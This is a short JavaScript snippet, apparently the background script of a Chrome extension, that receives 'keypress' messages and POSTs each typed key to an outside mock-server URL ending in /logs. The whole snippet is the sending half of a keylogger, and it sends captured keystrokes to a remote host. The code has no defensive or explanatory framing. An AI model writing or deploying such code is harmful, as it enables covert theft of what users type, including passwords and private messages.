chrome.runtime.onMessage.addListener(function (request) {
  if (request.type === 'keypress') {
    // Send the request to the mock server
    fetch('https://ac0191bc-ecd0-40d1-9b4d-efac694665f4.mock.pstmn.io/logs', {
      method: 'POST',
      body: request.key
    })
      .then((response) => response.json())
      .then((json) => console.log(json));
  }
});
